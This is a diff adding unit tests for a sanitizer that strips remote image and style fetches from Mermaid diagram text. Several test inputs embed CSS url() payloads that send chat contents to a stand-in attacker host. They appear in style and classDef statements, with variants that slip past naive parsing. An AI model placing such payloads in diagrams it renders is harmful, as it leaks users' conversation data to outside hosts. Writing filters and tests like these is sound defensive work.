@@ -53,6 +53,14 @@ const ORDINARY = [
   'sequenceDiagram\n  participant Alice\n  properties Alice: {"class": "internal-service-actor-box"}\n  Alice->>Bob: hi',
   "gantt\n  title Plan\n  dateFormat YYYY-MM-DD\n  section A\n  Task 1 :a1, 2024-01-01, 30d",
   "pie title Pets\n  \"Dogs\" : 386\n  \"Cats\" : 85",
+  "flowchart LR; A[Start]-->B[End]; style A fill:#f96; style B fill:#bbf",
+  "stateDiagram-v2\n  A --> B; classDef x fill:#f96\n  class A x",
+  // The word in a label is text, even next to a backslash or `url(`.
+  'flowchart LR\n  A["Style transfer\\nmodel"] --> B',
+  'flowchart LR\n  A["see; style C:\\temp"] --> B',
+  "flowchart LR\n  A(style url(x)) --> B",
+  "flowchart LR\n  A -->|style url(x)| B",
+  "sequenceDiagram\n  Alice->>Bob: apply style from url(parameter)",
 ];
 
 for (const source of ORDINARY) {
@@ -66,6 +74,36 @@ test("the remote image key is dropped and the rest of the node kept", () => {
     stripRemoteDiagramImages('flowchart LR\n  A@{ img: "https://attacker.example/c", label: "Hi", w: 1 }'),
     'flowchart LR\n  A@{ "label":"Hi","w":1 }',
   );
+});
+
+test("a style statement after a semicolon cannot fetch either", () => {
+  const url = "url(https://attacker.example/collect?chat=secret)";
+  for (const [source, kept] of [
+    [`stateDiagram-v2\n  A --> B; classDef x fill:${url}\n  class A x`, "stateDiagram-v2\n  A --> B;\n  class A x"],
+    // A stateDiagram classDef runs to the end of the line, past any `;`.
+    [`stateDiagram-v2\n  classDef x fill:#f96;background:${url}\n  class A x`, "stateDiagram-v2\n\n  class A x"],
+    [`flowchart LR; A-->B; style A fill:${url}`, "flowchart LR; A-->B;"],
+    // A stateDiagram also takes a statement after a space, with no `;` before it.
+    [`stateDiagram-v2\n  A --> B classDef x fill:${url}\n  class A x`, "stateDiagram-v2\n  A --> B \n  class A x"],
+    [`stateDiagram-v2\n  [*] --> A\tclassDef x mask:${url}\n  class A x`, "stateDiagram-v2\n  [*] --> A\t\n  class A x"],
+    // A statement after a label that mentions the word is still caught.
+    [`stateDiagram-v2\n  state "a style x" as A\n  A --> B classDef x fill:${url}`, 'stateDiagram-v2\n  state "a style x" as A\n  A --> B '],
+    // The diagram type is read after a directive on the same line.
+    [`%%{init: {}}%%stateDiagram-v2\n  A --> B classDef x fill:${url}\n  class B x`, "%%{init: {}}%%stateDiagram-v2\n  A --> B \n  class B x"],
+    // State ids may hold brackets; they are not labels there.
+    [`stateDiagram-v2\n  A( --> B classDef x fill:${url}\n  class B x`, "stateDiagram-v2\n  A( --> B \n  class B x"],
+  ]) {
+    const out = stripRemoteDiagramImages(source);
+    assert.equal(out, kept);
+    assert.equal(stripRemoteDiagramImages(out), out);
+  }
+});
+
+test("a long line of style words is scanned in linear time", () => {
+  const line = `flowchart LR\n  A["${"style ".repeat(20000)}"] --> B; style A fill:url(https://attacker.example/x)`;
+  const started = performance.now();
+  assert.equal(stripRemoteDiagramImages(line), `flowchart LR\n  A["${"style ".repeat(20000)}"] --> B;`);
+  assert.ok(performance.now() - started < 1000);
 });
 
 test("every surface that draws a diagram uses the guarded plugin", () => {
